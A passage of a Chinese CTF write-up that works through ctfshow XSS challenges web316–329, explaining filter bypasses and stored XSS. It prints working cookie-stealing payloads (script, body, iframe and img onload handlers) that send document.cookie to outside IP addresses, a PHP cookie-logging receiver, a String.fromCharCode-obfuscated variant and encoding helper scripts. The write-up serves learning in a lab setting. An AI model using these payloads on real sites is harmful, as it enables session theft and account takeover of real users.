+<p>知道了攻击原理，我们需要另外创建一个php文件去执行后面这个1&#x3D;’+document.cookie的功能</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将xss语句插入网站后就可以等admin去访问网站了，访问之后就可以在服务器的网页目录中看到有cookie.txt文件，里面就有管理员的cookie啦</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120120352350.png" alt="image-20241120120352350"></p>
+<p>这里也可以看出后台是会有管理员进行定时的一个访问的，不然这题没法做了</p>
+<h3 id="payload2-window-open"><a href="#payload2-window-open" class="headerlink" title="payload2:window.open"></a>payload2:window.open</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://118.31.168.198:39543/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>window.open()</code> 方法用于打开一个新窗口或标签页，并加载指定的 URL并包含当前页面的cookie信息</p>
+<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><h3 id="过滤script标签"><a href="#过滤script标签" class="headerlink" title="#过滤script标签"></a>#过滤script标签</h3><p>一样的页面，题目提示说开始过滤，我们正常插入xss语句进去试试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现并没有弹窗，也没有生成正常的回显，猜测是script被过滤了导致无法插入页面</p>
+<p>我们看看有没有其他标签可以代替的</p>
+<h3 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h3><p>`<body>&#96; 标签是 HTML 文档结构中的一个重要标签，用来定义网页的主体部分</p>
+<p>语法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 页面内容放在这里 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;body&gt;</code> 标签常见属性：</p>
+<ul>
+<li><code>background</code>：指定页面背景的图片或颜色。</li>
+<li><code>text</code>：指定页面中文本的颜色。</li>
+<li><code>link</code>：指定未被访问链接的颜色。</li>
+<li><code>alink</code>：指定激活链接时的颜色。</li>
+<li><code>vlink</code>：指定已访问链接的颜色。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&quot;</span><span class="attr">http:</span>//[<span class="attr">ip</span>]/<span class="attr">xss.php</span>?<span class="attr">cookie</span>=<span class="string">&quot;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>xss.php文件的内容是不变的，都可以用来接受cookie</p>
+<h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><p>&lt;iframe&gt; 标签是在 HTML 中用来嵌入另一个 HTML 页面的标签</p>
+<p>语法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;嵌入页面的URL&quot;</span> <span class="attr">width</span>=<span class="string">&quot;宽度&quot;</span> <span class="attr">height</span>=<span class="string">&quot;高度&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;边框显示方式&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>常见属性</p>
+<ul>
+<li><code>src</code>：指定要嵌入的页面的 URL 地址。</li>
+<li><code>width</code>：指定 iframe 的宽度。</li>
+<li><code>height</code>：指定 iframe 的高度。</li>
+<li><code>frameborder</code>：指定是否显示 iframe 的边框。可以设置为 <code>1</code> 表示显示边框，<code>0</code> 表示隐藏边框。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&#x27;http://156.238.233.87/xss.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个 <code>&lt;iframe&gt;</code> 标签中，使用了 <code>onload</code> 事件。<code>onload</code> 事件在 <code>&lt;iframe&gt;</code> 内部的页面加载完成后被触发。</p>
+<h3 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h3><p><img> 标签是在 HTML 中用来插入图片的标签</p>
+<p>语法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片路径&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;替代文本&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>常见属性</p>
+<ul>
+<li><code>src</code>：指定要显示的图片的 URL 地址。</li>
+<li><code>alt</code>：用于指定图片的替代文本，当图片无法显示时会显示替代文本。这对于可访问性很重要，也有利于 SEO。</li>
+<li><code>width</code>：指定图片的宽度。</li>
+<li><code>height</code>：指定图片的高度。</li>
+<li><code>title</code>：提供一个关于图片的额外信息，通常当鼠标悬停在图片上时显示。</li>
+<li><code>style</code>：用于指定样式属性，如宽度、高度、边框等。</li>
+<li><code>class</code>：用于指定 CSS 类，可以通过 CSS 样式表来定义图片的样式。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">οnerrοr</span>=<span class="string">location.href</span>=<span class="string">&quot;&quot;</span><span class="attr">http:</span>//[<span class="attr">ip</span>]/<span class="attr">xss.php</span>?<span class="attr">cookie</span>=<span class="string">&quot;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>代码中利用了 <code>onerror</code> 事件。当浏览器无法加载指定的图片时（由于 <code>src</code> 属性中的路径为空），会触发 <code>onerror</code> 事件。</li>
+</ul>
+<p>不过好像我用img标签打不出来，看到别人的wp都打出来了，应该是环境问题</p>
+<p>这几个标签都是可以替代script的，其写法上会有些许不同</p>
+<h2 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h2><h3 id="增加标签过滤"><a href="#增加标签过滤" class="headerlink" title="#增加标签过滤"></a>#增加标签过滤</h3><p>一个个试试</p>
+<p>&lt;img alert(1)&gt;输入发现没有回显</p>
+<body>alert(1)</body>输入发现有回显
+
+<p>那我们试一下body标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://[ip]/xss.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120123544602.png" alt="image-20241120123544602"></p>
+<p>这里可以看到有flag了，第一个应该是我自己访问了这个网站拿到的我自己的cookie</p>
+<h2 id="web320-321"><a href="#web320-321" class="headerlink" title="web320-321"></a>web320-321</h2><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="#绕过空格"></a>#绕过空格</h3><p>先输入这个试试</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&#x27;http://[ip]/xss.php?xss=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候注意看url的参数，发现空格不见了</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120145254131.png" alt="image-20241120145254131"></p>
+<p>我们再加个空格试试</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span> =<span class="string">&quot;document.location.href=&#x27;http://[ip]/xss.php?xss=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--ctfshow/image-20241120145329147.png" alt="image-20241120145329147"></p>
+<p>这下可以确定空格是被过滤了的，我们这时候就需要绕过空格了</p>
+<p>绕过空格的姿势在rce里面有很多，我们试试行不行</p>
+<h3 id="绕过空格姿势"><a href="#绕过空格姿势" class="headerlink" title="绕过空格姿势"></a>绕过空格姿势</h3><p>&#x2F;**&#x2F;</p>
+<p>&#x2F;</p>
+<p>tab(%09)</p>
+<h3 id="额外的payload"><a href="#额外的payload" class="headerlink" title="额外的payload:"></a>额外的payload:</h3><h4 id="js中String-fromCharCode-方法"><a href="#js中String-fromCharCode-方法" class="headerlink" title="js中String.fromCharCode()方法"></a>js中String.fromCharCode()方法</h4><p>ascii码转字符</p>
+<p>在不断查找wp之后我发现了这个函数也能用来打payload</p>
+<p>用它我可以构造一个payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(***)`就是`&lt;script&gt;document.location.href=&#x27;http://120.46.41.173/Jay17/127.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里放两个脚本</p>
+<h4 id="字符串转ascii码脚本"><a href="#字符串转ascii码脚本" class="headerlink" title="字符串转ascii码脚本"></a>字符串转ascii码脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串: &quot;</span>)  <span class="comment"># 获取用户输入的字符串</span></span><br><span class="line">ascii_list = []</span><br><span class="line"><span class="comment"># 遍历字符串，将每个字符转换为ASCII码，并添加到列表中</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> input_str:</span><br><span class="line">    ascii_code = <span class="built_in">ord</span>(char)  <span class="comment"># 使用ord()函数获取字符的ASCII码</span></span><br><span class="line">    ascii_list.append(<span class="built_in">str</span>(ascii_code))  <span class="comment"># 将ASCII码转换为字符串并添加到列表</span></span><br><span class="line"><span class="comment"># 将列表中的ASCII码用逗号隔开，并打印结果</span></span><br><span class="line">result = <span class="string">&#x27;,&#x27;</span>.join(ascii_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的ASCII码:&quot;</span>, result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="ascii码转字符串脚本"><a href="#ascii码转字符串脚本" class="headerlink" title="ascii码转字符串脚本"></a>ascii码转字符串脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_to_string</span>(<span class="params">ascii_str</span>):</span><br><span class="line">    <span class="comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span></span><br><span class="line">    ascii_list = ascii_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(code)) <span class="keyword">for</span> code <span class="keyword">in</span> ascii_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># 输入以逗号分隔的ASCII码字符串</span></span><br><span class="line">ascii_str = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的ASCII码字符串: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行转换并打印结果</span></span><br><span class="line">string_result = ascii_to_string(ascii_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的字符串:&quot;</span>, string_result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web322-326"><a href="#web322-326" class="headerlink" title="web322-326"></a>web322-326</h2><h3 id="过滤xss"><a href="#过滤xss" class="headerlink" title="#过滤xss"></a>#过滤xss</h3><p>常规的先试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://[ip]/xss.php?xss=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--ctfshow/image-20241120151233543.png" alt="image-20241120151233543"></p>
+<p>这样看的话是没什么问题的，还是跟之前一样是过滤了空格，但是我正常插入我的payload的时候发现没有跳转成功</p>
+<p>我一开始以为是我的标签被过滤了，然后换了几个都没成功，后面才发现是xss被过滤了</p>
+<p>然后我就把php代码里面的参数改成cookie就成功了(因为我上一题测试的时候把参数从cookie换成xss了，所以刚好碰到这道题过滤了xss，也算是刚好学到这道题了) </p>
+<p>注:后面发现好像不止过滤了xss，script和空格，还过滤了img，iframe，分号和逗号，各位可以去测试一下</p>
+<h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>跟322的做法一样，不过因为我最后不是发现了322过滤了其他的字符嘛，我就拿来测试了一下</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120153753204.png" alt="image-20241120153753204"></p>
+<p>确实是过滤了img标签</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120153647539.png" alt="image-20241120153647539"></p>
+<p>iframe标签也被过滤了</p>
+<p>剩下的符号我感觉跟payload暂时没什么关系，就不测了</p>
+<h1 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h1><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>这次是开始存储型xss了</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121163235464.png" alt="image-20241121163235464"></p>
+<p>是一个写信的界面，因为我们写入的信会存储到服务器数据库中，所以我们可以把恶意代码存入数据库中，当用户浏览我们的信封时候就会执行xss代码，我们可以先做个测试</p>
+<p>上面已经对存储型xss进行了一定的了解，这里就直接开始测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>往信封中插入这条最简单的语句</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121163720264.png" alt="image-20241121163720264"></p>
+<p>然后发现发送不了，然后我们看一下cookie发现也是需要admin权限，所以我们这封信应该发给admin，有思路了那就拿之前的payload放进去</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121164836097.png" alt="image-20241121164836097"></p>
+<p>发现上传成功，等待后台admin查阅信封就行，差不多几秒钟就可以了</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121164916830.png" alt="image-20241121164916830"></p>
+<p>就可以拿到flag了</p>
+<p>什么原理呢?因为我们的flag是来自于admin的cookie，所以我们需要让admin去访问链接执行这个xss代码，假设我们信封发给别人的话，信封会存储在数据库中，这个信封admin是不一定能接收到的，就比如我们通过qq邮箱向我们亲爱的舍友发送一个带有xss语句的恶意链接，这个信封只是发给你舍友，只有他当这个冤大头去点击这个链接，同理就可以知道为什么是发给admin了</p>
+<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>是一个登录界面</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121165611266.png" alt="image-20241121165611266"></p>
+<p>尝试用admin和弱密码登录一下</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121172155875.png" alt="image-20241121172155875"></p>
+<p>可以看到这里是登录失败了，那我们用admin注册一下</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121172225582.png" alt="image-20241121172225582"></p>
+<p>显示不是admin，emmm那我们先随机注册一个，注册成功后登录</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121172354984.png" alt="image-20241121172354984"></p>
+<p>但是也没啥东西，我们看一下用户管理</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121172418105.png" alt="image-20241121172418105"></p>
+<p>显示还是需要管理员身份，这时候我们就有方向了，我们可以通过获取管理员的cookie，伪造管理员的身份去访问，这样就可以看到用户管理的界面了，或者另一个思路，也就是预期解，因为这里可以看到一个包含用户名和密码的数据库，所以我们通过注入xss语句在数据库中，当管理员访问的时候会让xss语句解析执行</p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解:"></a>预期解:</h3><p>注册界面，在用户或者密码那里填入xss语句都行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&#x27;http://[ip]/xss.php?xss=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是后来发现body用不了，那我们换成script试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&quot;http://[ip]/xss.php?cookie=&quot;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传后等一下，就可以在我们的服务器看到cookie.txt</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121192145834.png" alt="image-20241121192145834"></p>
+<p>这个应该就是admin的cookie了，在页面中修改cookie的值，然后刷新一下页面，发现页面一闪而过就没了</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121192524240.png" alt="image-20241121192524240"></p>
+<p>这个应该是抓到包才能看到回显了，那我们重新刷新网页然后抓包改cookie看看</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241121193746146.png" alt="image-20241121193746146"></p>
+<p>为啥这里看不到内容呢?后来我看了官方的wp，官方是重启了js，但我这里重启了也不得行，那就只能跳过这道题了</p>
+<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241202112143252.png" alt="image-20241202112143252"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">XSS跨站漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01xss%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x01xss前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02xss%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">0x02xss介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.2.2.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%B1%82%E9%9D%A2"><span class="toc-number">1.2.4.</span> <span class="toc-text">产生层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3%EF%BC%88%E8%83%BD%E6%8B%BF%E6%9D%A5%E5%B9%B2%E4%BB%80%E4%B9%88%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">危害（能拿来干什么）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.7.</span> <span class="toc-text">利用环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03xss%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text">0x03xss攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04xss%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.4.</span> <span class="toc-text">0x04xss分类及介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B-%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">1、反射型(非持久化)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">2.存储型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05xss%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.5.</span> <span class="toc-text">0x05xss常见标签语句</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">0x01&lt;a&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.2.</span> <span class="toc-text">0x02. &lt;img&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.3.</span> <span class="toc-text">0x03. &lt;iframe&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.4.</span> <span class="toc-text">0x04. &lt;audio&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.5.</span> <span class="toc-text">0x05. &lt;video&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.6.</span> <span class="toc-text">0x06. &lt;svg&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.7.</span> <span class="toc-text">0x07. &lt;button&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.8.</span> <span class="toc-text">0x08. &lt;div&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.9.</span> <span class="toc-text">0x09. &lt;object&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.10.</span> <span class="toc-text">0x10. &lt;script&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.11.</span> <span class="toc-text">0x11. &lt;p&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.12.</span> <span class="toc-text">0x12. &lt;input&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.13.</span> <span class="toc-text">0x13. &lt;details&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.14.</span> <span class="toc-text">0x14. &lt;select&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.15.</span> <span class="toc-text">0x15. &lt;form&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.16.</span> <span class="toc-text">0x16. &lt;body&gt; 标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss"><span class="toc-number">2.</span> <span class="toc-text">反射性xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web316"><span class="toc-number">2.1.</span> <span class="toc-text">web316</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">#反射性xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span 